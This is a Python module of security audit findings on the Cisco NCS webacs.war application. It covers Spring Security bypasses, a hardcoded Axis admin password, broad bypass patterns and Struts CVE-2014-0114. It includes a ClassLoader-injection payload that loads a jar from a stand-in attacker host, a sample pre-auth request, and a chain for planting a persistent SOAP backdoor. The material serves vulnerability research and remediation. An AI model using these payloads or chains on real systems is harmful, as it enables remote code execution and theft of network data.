"""
Cisco NCS Web Application (webacs.war) Attack Surface RE Module
Targets (from NetworkControlSystem-1.1.3.2-1.x86_64.rpm):
  apache-tomcat/webapps/webacs.war -- main NCS management web application
    WEB-INF/classes/wap-security.xml          -- Spring Security configuration
    WEB-INF/server-config.wsdd                -- Apache Axis SOAP service definitions
    WEB-INF/struts-config/common-config.xml   -- Struts 1 action definitions

Framework versions:
  Spring Framework: 3.0.0.RELEASE (2009)
  Spring Security: 3.0.0.RELEASE
  Apache Axis: 1.4.0 (com.springsource.org.apache.axis-1.4.0.jar)
  Apache Struts: 1.3.10 (struts-taglib-1.3.10.jar)
  Apache CXF: (REST API on /rs/*)
  Hibernate: (ORM layer)

Spring Security bypass summary:
  57 URL patterns configured with filters="none" (bypass Spring Security entirely)
  Key functional bypasses (non-static resources):
    /xmlReportsAction.do.*       -- Struts action: WLAN XML report generation
    /rs/registry/app.*           -- REST: application registry metadata
    /authStateAction.*           -- Struts: authentication state check
    /LicenseOverCheck.do.*       -- Struts: license status check
    /welcomeAction.do            -- Struts: welcome action
    /monitorExternalMaps.*       -- Monitor external maps (pre-auth)
    /externalMaps.*              -- External maps (pre-auth)
    /services/ClientApi.*        -- Axis SOAP: NCS client management API
    /services/ConfigTemplateApi.* -- Axis SOAP: configuration template API
    /html*                       -- All /html* paths (broad pattern)
    /json*                       -- All /json* paths (broad pattern)
    /WEB-INF/.*                  -- WEB-INF directory accessible (abnormal)

Axis SOAP services defined (server-config.wsdd):
  AdminService     -- org.apache.axis.utils.Admin (enableRemoteAdmin=false)
  Version          -- org.apache.axis.Version (no auth required)
  SOAPMonitorService -- org.apache.axis.monitor.SOAPMonitorService
  MonitorApi       -- com.cisco.ws.api.MonitorApiSkeleton (VerifyAuthHandler)
  SearchApi        -- (VerifyAuthHandler)
  AdminApi         -- (VerifyAuthHandler)
  InventoryApi     -- (VerifyAuthHandler)
  ClientApi        -- com.cisco.ws.api.ClientApiSkeleton (VerifyAuthHandler + Spring bypass)
  ConfigTemplateApi -- com.cisco.ws.api.ConfigTemplateApiSkeleton (VerifyAuthHandler + Spring bypass)

Axis global config:
  adminPassword=admin (hardcoded, fleet-wide default)
  enableRemoteAdmin=false (blocks AdminService for remote calls)
"""

METADATA = {
    "war_file": "apache-tomcat/webapps/webacs.war",
    "war_size_bytes": 84637458,
    "build_date": "2013-01-31",
    "spring_version": "3.0.0.RELEASE",
    "axis_version": "1.4.0",
    "struts_version": "1.3.10",
    "axis_admin_password": "admin",
    "axis_remote_admin_enabled": False,
    "spring_security_bypass_count": 57,
    "unauthenticated_endpoints": [
        "/xmlReportsAction.do",
        "/rs/registry/app",
        "/services/Version",
        "/authStateAction",
        "/LicenseOverCheck.do",
        "/welcomeAction.do",
        "/services/MonitorApi?wsdl",
        "/services/ClientApi?wsdl",
        "/services/ConfigTemplateApi?wsdl",
    ],
}

FINDINGS = [
    {
        "id": "F1",
        "title": "Pre-Auth WLAN Infrastructure Data Disclosure via /xmlReportsAction.do (Spring Security Bypass)",
        "severity": "HIGH",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "cwe": "CWE-306",
        "description": (
            "The NCS web application Spring Security configuration (wap-security.xml) "
            "explicitly bypasses authentication for /xmlReportsAction.do via: "
            "<security:intercept-url pattern='/xmlReportsAction.do.*' filters='none' /> "
            "The Struts 1 action mapped to /xmlReportsAction.do is: "
            "com.cisco.webui.action.reports.XmlReportsAction "
            "This action generates XML-formatted WLAN infrastructure reports. "
            "The action processes request parameters: graphId, retrieveMetadata, objectId, "
            "adhocType, adhocName, adhocValue, dashletId, scopeName, scopeValue -- "
            "all standard NCS dashboard report parameters for retrieving WLAN telemetry. "
            "NCS manages Cisco WLAN controllers and their associated access points, "
            "clients, and wireless infrastructure. Reports available through this endpoint "
            "include: client IP/MAC address associations, AP inventory and status, "
            "controller configuration, RF performance data, location data, rogue AP data. "
            "Because Spring Security is bypassed with filters='none' (not just a role check "
            "that could be bypassed, but complete removal of the security filter chain), "
            "the action executes with the Tomcat container's default behavior: no session "
            "required, no CSRF token checked, no role verification. "
            "The action's parent class (UiAction) does not perform secondary authentication "
            "checks based on constant pool analysis (no SecurityContext/getAuthentication calls). "
            "A second unauthenticated report path exists: /xmlDeviceReportsAction.do "
            "which forwards to /xmlReportsAction.do, also with filters='none'. "
            "Example pre-auth request: "
            "GET http://<ncs>/xmlReportsAction.do?graphId=<id>&retrieveMetadata=true "
            "Impact: attacker recovers complete WLAN client census (MAC/IP/hostname), "
            "AP deployment map, controller topology, and network segment layout from NCS "
            "without any authentication. This data enables targeted lateral movement "
            "within the managed WLAN infrastructure."
        ),
        "endpoint": "/xmlReportsAction.do",
        "action_class": "com.cisco.webui.action.reports.XmlReportsAction",
        "struts_config": "WEB-INF/struts-config/common-config.xml",
        "spring_security_config": "WEB-INF/classes/wap-security.xml",
        "impact": [
            "Pre-auth read: WLAN client IP/MAC/hostname data from NCS management database",
            "Pre-auth read: AP inventory, controller topology, RF coverage maps",
            "Pre-auth read: rogue AP detection data, network segment layout",
        ],
        "remediation": (
            "Remove filters='none' from /xmlReportsAction.do in wap-security.xml. "
            "Require at minimum IS_AUTHENTICATED_FULLY on all .do action paths. "
            "Platform is EOL -- no patch path."
        ),
    },
    {
        "id": "F2",
        "title": "Apache Axis 1.4 adminPassword='admin' Hardcoded + WSDL Endpoint Unauthenticated",
        "severity": "MEDIUM",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "cwe": "CWE-321",
        "description": (
            "Apache Axis 1.4.0 is the SOAP framework for the NCS web service API. "
            "The global Axis configuration (WEB-INF/server-config.wsdd) contains: "
            "<parameter name='adminPassword' value='admin'/> "
            "This is the Axis AdminService credential, hardcoded as 'admin' fleet-wide. "
            "The Axis AdminService allows: deploying new SOAP services, undeploying existing "
            "services, and modifying service configurations. Deployment = arbitrary Java class "
            "loading from the server classpath = code execution. "
            "In the shipped configuration: enableRemoteAdmin=false blocks remote AdminService "
            "calls. The adminPassword='admin' becomes exploitable if: "
            "(1) An attacker with any write access to server-config.wsdd changes enableRemoteAdmin=true "
            "    (possible via the RCE chain in cisco_ncs_remoting_rce_re.py F1), "
            "or (2) A local NCS administrator or misconfiguration enables remote admin. "
            "Independently: Apache Axis 1.4 exposes WSDL descriptors for all services "
            "without authentication: "
            "  GET /services/MonitorApi?wsdl       -- full WLAN monitor API WSDL "
            "  GET /services/ClientApi?wsdl        -- NCS client management WSDL "
            "  GET /services/ConfigTemplateApi?wsdl -- config template WSDL "
            "  GET /services/AdminApi?wsdl         -- admin API WSDL "
            "  GET /services/InventoryApi?wsdl     -- inventory API WSDL "
            "  GET /services/Version               -- returns Axis version (unauthenticated) "
            "The WSDL responses enumerate all service method signatures, parameter types, "
            "namespace URIs, and type bindings. This is not blocked by the Axis VerifyAuthHandler "
            "because WSDL discovery is handled at the Axis transport layer before handler invocation. "
            "Known CVEs for Axis 1.4: "
            "CVE-2019-0227: SSRF via SAXParserFactory -- affects Axis 1.4 "
            "CVE-2023-40743: server-side request forgery via getPivot "
            "Both are still present (EOL platform, no patches applied)."
        ),
        "axis_version": "1.4.0",
        "admin_password": "admin",
        "admin_service_protected": True,
        "wsdl_endpoints_unauth": [
            "/services/MonitorApi?wsdl",
            "/services/ClientApi?wsdl",
            "/services/ConfigTemplateApi?wsdl",
            "/services/AdminApi?wsdl",
            "/services/InventoryApi?wsdl",
        ],
        "cves": ["CVE-2019-0227", "CVE-2023-40743"],
        "impact": [
            "adminPassword='admin': enables AdminService if enableRemoteAdmin flipped (post-RCE)",
            "WSDL unauthenticated: full API method signatures enumerable pre-auth",
            "Axis 1.4 SSRF (CVE-2019-0227): server-side requests from NCS process",
        ],
        "remediation": (
            "Change adminPassword to a random per-deployment value. "
            "Disable Axis WSDL endpoint exposure (?wsdl) in production. "
            "Upgrade to Apache CXF (Axis 1.x EOL since 2010). "
            "Platform is EOL -- no patch path."
        ),
    },
    {
        "id": "F3",
        "title": "Spring Security 57-Path Bypass with Broad /WEB-INF/.* and /json* Patterns",
        "severity": "MEDIUM",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "cwe": "CWE-284",
        "description": (
            "The NCS Spring Security configuration (wap-security.xml) has 57 paths "
            "configured with filters='none'. Several patterns are overly broad: "
            "(1) /WEB-INF/.* -- explicitly bypasses Spring Security for the WEB-INF directory. "
            "While the servlet container normally blocks direct HTTP access to /WEB-INF/, "
            "certain application containers and path-traversal sequences can expose "
            "WEB-INF contents. This pattern signals intent to bypass, not block, access. "
            "If path traversal becomes possible via any forwarded request (Struts/Spring "
            "forward to /WEB-INF/...), Spring Security would not apply. "
            "(2) /json* -- all paths starting with 'json' are unauthenticated. "
            "This is intended for /js/... but the wildcard matches /jsonReportsAction "
            "or any future endpoint beginning with 'json'. "
            "(3) /html* -- all paths starting with 'html' are unauthenticated. "
            "Intent: static HTML help files. Scope: any /htmlAdmin, /htmlReport, etc. "
            "(4) /services/ClientApi.* and /services/ConfigTemplateApi.* bypass Spring "
            "Security. These SOAP endpoints rely solely on the Axis VerifyAuthHandler "
            "(com.cisco.ws.server.handler.AuthenticationHandler) for protection. "
            "The VerifyAuthHandler accepts NCS user credentials via SOAP headers. "
            "If the VerifyAuthHandler is bypassable (e.g., null credential handling, "
            "empty string bypass, or the hardcoded adminPassword='admin'), these SOAP "
            "APIs -- which manage WLAN clients and configuration templates -- would be "
            "fully unauthenticated. "
            "The NCS platform uses Spring Security 3.0.0.RELEASE (2009). "
            "This version predates many security hardening additions and CSRF protection "
            "that are standard in current Spring Security releases."
        ),
        "spring_security_version": "3.0.0.RELEASE",
        "bypass_count": 57,
        "broad_patterns": [
            "/WEB-INF/.* -- WEB-INF accessible via Spring Security bypass",
            "/json*       -- overly broad (any /json* path, not just /js/)",
            "/html*       -- overly broad (any /html* path)",
        ],
        "soap_spring_bypass": [
            "/services/ClientApi.* -- Spring bypass, relies on Axis VerifyAuthHandler only",
            "/services/ConfigTemplateApi.* -- Spring bypass, relies on Axis VerifyAuthHandler only",
        ],
        "impact": [
            "/WEB-INF bypass: if path traversal via forward chain -> server-config.wsdd readable",
            "Broad /json* and /html* patterns: any matching endpoint bypasses Spring Security",
            "ClientApi/ConfigTemplateApi: single-layer auth (Axis only) for WLAN management APIs",
        ],
        "remediation": (
            "Audit all 57 bypass paths. Apply principle of least privilege. "
            "Replace broad wildcards (/json*, /html*) with explicit static resource paths. "
            "Remove /WEB-INF/.* bypass -- no direct HTTP access to WEB-INF is needed. "
            "Platform is EOL -- no patch path."
        ),
    },
    {
        "id": "F4",
        "title": "Apache Struts 1.3.10 CVE-2014-0114 ClassLoader Manipulation on ActionForm Endpoints",
        "severity": "LOW",
        "cvss": 4.0,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L",
        "cwe": "CWE-470",
        "description": (
            "The NCS web application uses Apache Struts 1.3.10 (struts-taglib-1.3.10.jar). "
            "Struts 1.3.10 is vulnerable to CVE-2014-0114: ClassLoader manipulation via "
            "ActionForm bean properties. When Struts processes an HTTP request through an "
            "ActionForm, BeanUtils.populate() sets properties on the form bean. "
            "An attacker can inject: "
            "  class.classLoader.urls[0]=jar:http://attacker/evil.jar!/ "
            "This modifies the webapp ClassLoader's URL list to load attacker-controlled "
            "classes, leading to RCE within the Tomcat JVM. "
            "CVE-2014-0114 affects Struts 1.x ALL versions (no fix released for Struts 1.x "
            "-- Struts 1.x reached EOL in 2013, the same year as this NCS build). "
            "Exploitation requires: "
            "(1) Access to any Struts action that processes an ActionForm with bean properties. "
            "The NCS webacs application has hundreds of Struts actions (configure-switch.xml "
            "alone has 1.3MB of action definitions with ActionForm bindings). "
            "(2) At minimum, access to the NCS web application (post-login or via an "
            "unauthenticated ActionForm endpoint). "
            "The unauthenticated Struts actions (/xmlReportsAction.do, /LicenseOverCheck.do) "
            "do not define ActionForms (no 'name=' attribute in the struts-config), so "
            "CVE-2014-0114 may not be directly exploitable on those endpoints. "
            "However, authenticated NCS users can use any of the numerous ActionForm-based "
            "actions (device configuration, report generation, client management) to exploit "
            "this vulnerability and escalate beyond their NCS role to OS-level code execution. "
            "Note: the Spring HttpInvoker deserialization RCE (cisco_ncs_remoting_rce_re.py F1) "
            "provides pre-auth OS access, making this finding a lower-priority alternate path."
        ),
        "struts_version": "1.3.10",
        "cve": "CVE-2014-0114",
        "condition": "Requires authenticated NCS user or unauthenticated ActionForm endpoint",
        "exploit": (
            "POST /configureSwitch.do HTTP/1.1\n"
            "class.classLoader.urls[0]=jar:http://attacker:8080/payload.jar!/"
        ),
        "impact": [
            "CVE-2014-0114: ClassLoader URL injection -> arbitrary class loading -> RCE",
            "Affects all ActionForm-based Struts 1 actions (hundreds of endpoints in webacs)",
            "No Struts 1.x patch exists (EOL 2013)",
        ],
        "remediation": (
            "Migrate from Struts 1.x to a supported framework. "
            "Apply the ClassLoader protection filter (Struts 1.3.10 work-around: "
            "configure ClassLoaderFilter servlet filter to block class.* parameters). "
            "Platform is EOL -- no patch path."
        ),
    },
]

SUMMARY = {
    "total":    4,
    "critical": 0,
    "high":     1,
    "medium":   2,
    "low":      1,
    "notes": (
        "F1 (xmlReportsAction pre-auth bypass) is the primary new finding: Spring Security "
        "explicitly bypasses authentication for WLAN report generation, exposing NCS-managed "
        "client and infrastructure data without credentials. "
        "F2 (Axis 1.4 adminPassword='admin') chains with cisco_ncs_remoting_rce_re.py F1: "
        "post-deserialization-RCE, flip enableRemoteAdmin=true and use password='admin' to "
        "deploy a new SOAP service = persistent backdoor via AdminService. "
        "F3 (57-path bypass) documents the systemic over-breadth of the Spring Security config. "
        "The /services/ClientApi and /services/ConfigTemplateApi bypass Spring Security "
        "entirely, leaving WLAN management SOAP APIs protected only by the Axis VerifyAuthHandler "
        "whose strength is unknown without AuthenticationHandler source. "
        "F4 (Struts 1.3.10 CVE-2014-0114) is a lower-severity alternate RCE path for "
        "authenticated NCS users; the unauthenticated deserialization RCE (prior module F1) "
        "renders this a secondary finding."
    ),
}
